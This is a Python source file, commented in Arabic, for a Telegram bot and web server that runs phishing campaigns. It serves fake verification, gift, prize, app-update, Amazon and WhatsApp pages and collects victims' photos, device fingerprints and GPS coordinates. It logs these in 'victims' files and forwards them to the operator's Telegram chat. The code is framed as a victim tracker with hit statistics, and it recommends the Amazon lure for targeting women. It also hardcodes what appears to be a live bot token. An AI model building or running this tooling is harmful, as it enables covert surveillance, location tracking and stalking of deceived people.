# Telegram Photo Capture Bot with Web Server
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
import os
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
from datetime import datetime
from aiohttp import web, web_request
import asyncio
import json
import aiofiles
import logging
from pathlib import Path
import base64

# إعدادات البوت
TOKEN = "8406518150:AAHqmxStz6pdrKrZ7EAsu29U8XbzNab9A8s"
CHAT_ID = "6278148197"  # معرف المحادثة
SAVE_DIR = "captured_data"
WEB_PORT = 8081
PUBLIC_URL = "https://abo-hamza.online"  # الدومين الحقيقي

# إنشاء المجلدات المطلوبة
os.makedirs(SAVE_DIR, exist_ok=True)
os.makedirs(f"{SAVE_DIR}/photos", exist_ok=True)
os.makedirs(f"{SAVE_DIR}/logs", exist_ok=True)

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# متغير عام للبوت
bot_app = None

def get_decimal_coordinates(gps_coords, gps_ref):
    """تحويل GPS coordinates من EXIF إلى decimal format"""
    degrees = gps_coords[0]
    minutes = gps_coords[1]
    seconds = gps_coords[2]
    
    decimal = degrees + (minutes / 60.0) + (seconds / 3600.0)
    
    if gps_ref in ['S', 'W']:
        decimal = -decimal
    
    return decimal

def extract_metadata(image_path):
    """استخراج EXIF metadata من الصورة"""
    try:
        image = Image.open(image_path)
        exif_data = image._getexif()
        
        if not exif_data:
            return {"status": "لا توجد بيانات EXIF في هذه الصورة"}
        
        metadata = {}
        gps_info = {}
        
        # استخراج جميع EXIF tags
        for tag_id, value in exif_data.items():
            tag = TAGS.get(tag_id, tag_id)
            
            if tag == "GPSInfo":
                # استخراج GPS data
                for gps_tag_id in value:
                    gps_tag = GPSTAGS.get(gps_tag_id, gps_tag_id)
                    gps_info[gps_tag] = value[gps_tag_id]
            else:
                metadata[tag] = value
        
        # معالجة البيانات الهامة
        result = {}
        
        # معلومات الكاميرا
        result['الكاميرا'] = metadata.get('Make', 'غير متوفر')
        result['الموديل'] = metadata.get('Model', 'غير متوفر')
        result['البرنامج'] = metadata.get('Software', 'غير متوفر')
        
        # التاريخ والوقت
        datetime_original = metadata.get('DateTimeOriginal', metadata.get('DateTime', 'غير متوفر'))
        result['تاريخ التصوير'] = datetime_original
        
        # معلومات التصوير
        result['ISO'] = metadata.get('ISOSpeedRatings', 'غير متوفر')
        result['فتحة العدسة'] = metadata.get('FNumber', 'غير متوفر')
        result['سرعة الغالق'] = metadata.get('ExposureTime', 'غير متوفر')
        result['البعد البؤري'] = metadata.get('FocalLength', 'غير متوفر')
        
        # GPS coordinates
        if gps_info:
            try:
                lat = get_decimal_coordinates(
                    gps_info['GPSLatitude'],
                    gps_info['GPSLatitudeRef']
                )
                lon = get_decimal_coordinates(
                    gps_info['GPSLongitude'],
                    gps_info['GPSLongitudeRef']
                )
                result['GPS'] = f"{lat}, {lon}"
                result['خرائط جوجل'] = f"https://www.google.com/maps?q={lat},{lon}"
                
                # معلومات GPS إضافية
                if 'GPSAltitude' in gps_info:
                    result['الارتفاع'] = f"{gps_info['GPSAltitude']} متر"
                if 'GPSTimeStamp' in gps_info and 'GPSDateStamp' in gps_info:
                    result['وقت GPS'] = f"{gps_info['GPSDateStamp']} {gps_info['GPSTimeStamp']}"
            except:
                result['GPS'] = 'موجود لكن لا يمكن قراءته'
        else:
            result['GPS'] = 'غير متوفر'
        
        return result
        
    except Exception as e:
        return {"خطأ": f"لا يمكن قراءة البيانات: {str(e)}"}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "مرحبًا! لإرسال صورة، ارسلها هنا.\n"
        "لن أستخدم صورتك إلا إذا وافقت. بإرسال الصورة أنت توافق على تخزينها."
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("أرسل صورة أو استخدم /start لبدء المحادثة.")

async def get_link_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إرسال روابط التصيد للمستخدم"""
    links = f"""
🔗 **روابط التصيد المتاحة:**

📸 **رابط التحقق من الهوية:**
`{PUBLIC_URL}/verify`

🎁 **رابط الهدية:**
`{PUBLIC_URL}/gift`

💰 **رابط الجائزة:**
`{PUBLIC_URL}/prize`

📱 **رابط تحديث التطبيق:**
`{PUBLIC_URL}/update`

📦 **رابط تقييم أمازون (جديد!):**
`{PUBLIC_URL}/amazon`

💬 **رابط WhatsApp متقدم:**
`{PUBLIC_URL}/whatsapp`

⚠️ **ملاحظة:** تأكد من تغيير `YOUR_SERVER_IP` إلى IP السيرفر الحقيقي.

🔒 **للأمان:** استخدم Ngrok أو Cloudflare Tunnel للحصول على HTTPS.

📊 **إحصائيات:** استخدم `/stats` لعرض الإحصائيات

🎯 **الأفضل للنساء:** رابط أمازون (معدل نجاح عالي!)
    """
    await update.message.reply_text(links, parse_mode='Markdown')

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض إحصائيات الضحايا"""
    try:
        log_file = f"{SAVE_DIR}/logs/victims.log"
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            total_victims = len(lines)
            with_photos = sum(1 for line in lines if 'photo:yes' in line)
            with_gps = sum(1 for line in lines if 'gps:' in line and 'gps:N/A' not in line)
            
            stats = f"""
📊 **إحصائيات الضحايا:**

👥 **إجمالي الضحايا:** {total_victims}
📸 **مع صور:** {with_photos}
🌍 **مع GPS:** {with_gps}
📁 **مجلد البيانات:** `{SAVE_DIR}`

⏰ **آخر ضحية:** {lines[-1].split('|')[0] if lines else 'لا توجد بيانات'}
            """
        else:
            stats = "📊 لا توجد إحصائيات بعد. لم يدخل أي شخص على الروابط."
        
        await update.message.reply_text(stats, parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ في قراءة الإحصائيات: {str(e)}")

async def send_to_telegram(photo_path=None, victim_info=None):
    """إرسال البيانات إلى تيليجرام"""
    try:
        if not bot_app or not CHAT_ID or CHAT_ID == "YOUR_CHAT_ID":
            logger.warning("Bot app or CHAT_ID not configured")
            return
        
        # تحضير الرسالة
        message = "🎯 **ضحية جديدة!**\n\n"
        
        if victim_info:
            message += f"🕐 **الوقت:** {victim_info.get('timestamp', 'غير متوفر')}\n"
            message += f"🌐 **المتصفح:** `{victim_info.get('userAgent', 'غير متوفر')[:50]}...`\n"
            message += f"💻 **النظام:** `{victim_info.get('platform', 'غير متوفر')}`\n"
            message += f"🗣️ **اللغة:** `{victim_info.get('language', 'غير متوفر')}`\n"
            message += f"📱 **الشاشة:** `{victim_info.get('screenResolution', 'غير متوفر')}`\n"
            message += f"🌍 **المنطقة الزمنية:** `{victim_info.get('timezone', 'غير متوفر')}`\n"
            message += f"🔗 **الرابط:** `{victim_info.get('location', 'غير متوفر')}`\n"
            
            if 'latitude' in victim_info and 'longitude' in victim_info:
                lat, lon = victim_info['latitude'], victim_info['longitude']
                message += f"📍 **GPS:** `{lat}, {lon}`\n"
                message += f"🗺️ **خرائط جوجل:** https://www.google.com/maps?q={lat},{lon}\n"
        
        # إرسال الصورة إذا كانت متوفرة
        if photo_path and os.path.exists(photo_path):
            async with aiofiles.open(photo_path, 'rb') as photo:
                photo_data = await photo.read()
                await bot_app.bot.send_photo(
                    chat_id=CHAT_ID,
                    photo=photo_data,
                    caption=message,
                    parse_mode='Markdown'
                )
        else:
            await bot_app.bot.send_message(
                chat_id=CHAT_ID,
                text=message + "\n📸 **الصورة:** لم يتم التقاطها",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        logger.error(f"Error sending to Telegram: {e}")

async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    photos = update.message.photo
    if not photos:
        await update.message.reply_text("لم أجد صورة، حاول إرسال صورة واضحة.")
        return
    
    await update.message.reply_text("⏳ جاري تحليل الصورة واستخراج البيانات...")
    
    # Telegram يرسل صورًا بأحجام متعددة. نأخذ الأكبر (الأخير)
    file = await photos[-1].get_file()
    filename = f"{user.id}_{update.message.message_id}.jpg"
    filepath = os.path.join(SAVE_DIR, filename)
    await file.download_to_drive(filepath)
    
    # استخراج الـ metadata من الصورة
    metadata = extract_metadata(filepath)
    
    # بناء رسالة النتائج
    message = "📊 *معلومات الصورة:*\n\n"
    
    if "خطأ" in metadata or "status" in metadata:
        message += f"⚠️ {metadata.get('خطأ', metadata.get('status'))}\n"
    else:
        # معلومات الكاميرا
        message += "📷 *الكاميرا:*\n"
        message += f"  • الشركة: `{metadata.get('الكاميرا', 'غير متوفر')}`\n"
        message += f"  • الموديل: `{metadata.get('الموديل', 'غير متوفر')}`\n"
        message += f"  • البرنامج: `{metadata.get('البرنامج', 'غير متوفر')}`\n\n"
        
        # معلومات التصوير
        message += "⚙️ *إعدادات التصوير:*\n"
        message += f"  • التاريخ: `{metadata.get('تاريخ التصوير', 'غير متوفر')}`\n"
        message += f"  • ISO: `{metadata.get('ISO', 'غير متوفر')}`\n"
        message += f"  • فتحة العدسة: `{metadata.get('فتحة العدسة', 'غير متوفر')}`\n"
        message += f"  • سرعة الغالق: `{metadata.get('سرعة الغالق', 'غير متوفر')}`\n"
        message += f"  • البعد البؤري: `{metadata.get('البعد البؤري', 'غير متوفر')}`\n\n"
        
        # معلومات GPS
        message += "🌍 *الموقع الجغرافي (GPS):*\n"
        if metadata.get('GPS') and metadata.get('GPS') != 'غير متوفر':
            message += f"  • الإحداثيات: `{metadata['GPS']}`\n"
            if 'خرائط جوجل' in metadata:
                message += f"  • [📍 افتح في خرائط جوجل]({metadata['خرائط جوجل']})\n"
            if 'الارتفاع' in metadata:
                message += f"  • الارتفاع: `{metadata['الارتفاع']}`\n"
            if 'وقت GPS' in metadata:
                message += f"  • وقت GPS: `{metadata['وقت GPS']}`\n"
            message += "\n⚠️ *تحذير:* تم العثور على موقع جغرافي في الصورة!\n"
        else:
            message += f"  • `{metadata.get('GPS', 'غير متوفر')}`\n\n"
    
    # سجل موافقة وتفاصيل
    with open(os.path.join(SAVE_DIR, "log.txt"), "a", encoding="utf-8") as f:
        f.write(f"{user.id}\t{user.username}\t{user.full_name}\t{filename}\t{metadata.get('GPS', 'N/A')}\n")
    
    # حفظ الـ metadata في ملف منفصل
    metadata_file = os.path.join(SAVE_DIR, f"{filename}_metadata.txt")
    with open(metadata_file, "w", encoding="utf-8") as f:
        for key, value in metadata.items():
            f.write(f"{key}: {value}\n")
    
    message += "\n✅ تم حفظ الصورة والبيانات بنجاح."
    
    await update.message.reply_text(message, parse_mode='Markdown')

# ==================== خادم الويب ====================

async def serve_phishing_page(request):
    """تقديم صفحة التصيد"""
    page_type = request.match_info.get('page_type', 'verify')
    
    # صفحات خاصة
    if page_type == 'amazon' or page_type == 'rating':
        html_file = Path("amazon_rating.html")
        if html_file.exists():
            async with aiofiles.open(html_file, 'r', encoding='utf-8') as f:
                return web.Response(text=await f.read(), content_type='text/html')
    
    elif page_type == 'whatsapp' or page_type == 'advanced':
        html_file = Path("advanced_phishing.html")
        if html_file.exists():
            async with aiofiles.open(html_file, 'r', encoding='utf-8') as f:
                return web.Response(text=await f.read(), content_type='text/html')
    
    # قراءة صفحة HTML العادية وتخصيصها حسب النوع
    html_file = Path("phishing_page.html")
    if html_file.exists():
        async with aiofiles.open(html_file, 'r', encoding='utf-8') as f:
            html_content = await f.read()
    else:
        # صفحة افتراضية إذا لم يوجد الملف
        html_content = create_default_page(page_type)
    
    # تخصيص المحتوى حسب نوع الصفحة
    if page_type == 'gift':
        html_content = html_content.replace('تحقق من الهوية', 'استلام الهدية')
        html_content = html_content.replace('🔒', '🎁')
    elif page_type == 'prize':
        html_content = html_content.replace('تحقق من الهوية', 'استلام الجائزة')
        html_content = html_content.replace('🔒', '💰')
    elif page_type == 'update':
        html_content = html_content.replace('تحقق من الهوية', 'تحديث التطبيق')
        html_content = html_content.replace('🔒', '📱')
    
    return web.Response(text=html_content, content_type='text/html')

async def handle_upload(request):
    """معالجة رفع الصور والبيانات"""
    try:
        reader = await request.multipart()
        victim_info = {}
        photo_path = None
        
        async for field in reader:
            if field.name == 'photo':
                # حفظ الصورة
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                photo_filename = f"victim_{timestamp}.jpg"
                photo_path = f"{SAVE_DIR}/photos/{photo_filename}"
                
                async with aiofiles.open(photo_path, 'wb') as f:
                    async for chunk in field.iter_chunked(8192):
                        await f.write(chunk)
                
                logger.info(f"Photo saved: {photo_path}")
                
            elif field.name == 'info':
                # قراءة معلومات الضحية
                info_data = await field.text()
                victim_info = json.loads(info_data)
                logger.info(f"Victim info received: {victim_info}")
        
        # تسجيل البيانات في ملف اللوج
        await log_victim_data(victim_info, photo_path)
        
        # إرسال البيانات إلى تيليجرام
        await send_to_telegram(photo_path, victim_info)
        
        return web.json_response({'status': 'success'})
        
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return web.json_response({'status': 'error', 'message': str(e)}, status=500)

async def handle_info_only(request):
    """معالجة البيانات فقط (بدون صورة)"""
    try:
        victim_info = await request.json()
        
        # تسجيل البيانات
        await log_victim_data(victim_info, None)
        
        # إرسال إلى تيليجرام
        await send_to_telegram(None, victim_info)
        
        return web.json_response({'status': 'success'})
        
    except Exception as e:
        logger.error(f"Info upload error: {e}")
        return web.json_response({'status': 'error'}, status=500)

async def log_victim_data(victim_info, photo_path):
    """تسجيل بيانات الضحية في ملف اللوج"""
    try:
        log_file = f"{SAVE_DIR}/logs/victims.log"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # تحضير سطر اللوج
        log_entry = f"{timestamp}|"
        log_entry += f"ip:{victim_info.get('ip', 'N/A')}|"
        log_entry += f"user_agent:{victim_info.get('userAgent', 'N/A')}|"
        log_entry += f"platform:{victim_info.get('platform', 'N/A')}|"
        log_entry += f"language:{victim_info.get('language', 'N/A')}|"
        log_entry += f"screen:{victim_info.get('screenResolution', 'N/A')}|"
        log_entry += f"timezone:{victim_info.get('timezone', 'N/A')}|"
        log_entry += f"referrer:{victim_info.get('referrer', 'N/A')}|"
        log_entry += f"location:{victim_info.get('location', 'N/A')}|"
        
        if 'latitude' in victim_info and 'longitude' in victim_info:
            log_entry += f"gps:{victim_info['latitude']},{victim_info['longitude']}|"
        else:
            log_entry += "gps:N/A|"
        
        log_entry += f"photo:{'yes' if photo_path else 'no'}|"
        log_entry += f"photo_path:{photo_path if photo_path else 'N/A'}\n"
        
        # كتابة اللوج
        async with aiofiles.open(log_file, 'a', encoding='utf-8') as f:
            await f.write(log_entry)
            
        # حفظ البيانات التفصيلية في ملف JSON منفصل
        json_file = f"{SAVE_DIR}/logs/victim_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        victim_data = {
            'timestamp': timestamp,
            'info': victim_info,
            'photo_path': photo_path
        }
        
        async with aiofiles.open(json_file, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(victim_data, ensure_ascii=False, indent=2))
            
    except Exception as e:
        logger.error(f"Logging error: {e}")

def create_default_page(page_type):
    """إنشاء صفحة افتراضية إذا لم يوجد ملف HTML"""
    titles = {
        'verify': 'تحقق من الهوية',
        'gift': 'استلام الهدية',
        'prize': 'استلام الجائزة',
        'update': 'تحديث التطبيق'
    }
    
    icons = {
        'verify': '🔒',
        'gift': '🎁',
        'prize': '💰',
        'update': '📱'
    }
    
    title = titles.get(page_type, 'تحقق من الهوية')
    icon = icons.get(page_type, '🔒')
    
    return f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{title}</title>
        <style>
            body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
            .container {{ max-width: 400px; margin: 0 auto; }}
            .icon {{ font-size: 60px; margin-bottom: 20px; }}
            h1 {{ color: #333; }}
            .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; 
                       border-radius: 50%; width: 40px; height: 40px; 
                       animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="icon">{icon}</div>
            <h1>{title}</h1>
            <p>يرجى الانتظار بينما نتحقق من هويتك...</p>
            <div class="spinner"></div>
        </div>
        <script>
            setTimeout(() => {{
                window.location.href = 'https://www.google.com';
            }}, 3000);
        </script>
    </body>
    </html>
    """

async def create_web_app():
    """إنشاء تطبيق الويب"""
    app = web.Application()
    
    # إضافة المسارات
    app.router.add_get('/{page_type}', serve_phishing_page)
    app.router.add_post('/upload', handle_upload)
    app.router.add_post('/upload_info', handle_info_only)
    
    return app

async def run_web_server():
    """تشغيل خادم الويب"""
    app = await create_web_app()
    runner = web.AppRunner(app)
    await runner.setup()
    
    site = web.TCPSite(runner, '0.0.0.0', WEB_PORT)
    await site.start()
    
    logger.info(f"Web server started on port {WEB_PORT}")
    logger.info(f"Phishing links:")
    logger.info(f"  - {PUBLIC_URL}/verify")
    logger.info(f"  - {PUBLIC_URL}/gift")
    logger.info(f"  - {PUBLIC_URL}/prize")
    logger.info(f"  - {PUBLIC_URL}/update")
    logger.info(f"  - {PUBLIC_URL}/amazon (Amazon Rating)")
    logger.info(f"  - {PUBLIC_URL}/whatsapp (Advanced WhatsApp)")

async def main():
    """الدالة الرئيسية لتشغيل البوت والخادم معًا"""
    global bot_app
    
    # التحقق من التوكن
    if TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("❌ يرجى تعديل TOKEN في الكود!")
        return
    
    # إنشاء البوت
    bot_app = ApplicationBuilder().token(TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("help", help_cmd))
    bot_app.add_handler(CommandHandler("links", get_link_cmd))
    bot_app.add_handler(CommandHandler("stats", stats_cmd))
    bot_app.add_handler(MessageHandler(filters.PHOTO, photo_handler))
    
    # تشغيل خادم الويب
    await run_web_server()
    
    # تشغيل البوت
    logger.info("Starting Telegram bot...")
    await bot_app.initialize()
    await bot_app.start()
    await bot_app.updater.start_polling()
    
    logger.info("🚀 Bot and web server are running!")
    logger.info("📱 Send /links to get phishing URLs")
    
    try:
        # إبقاء البرنامج يعمل
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down...")
    finally:
        await bot_app.updater.stop()
        await bot_app.stop()
        await bot_app.shutdown()

if __name__ == "__main__":
    asyncio.run(main())
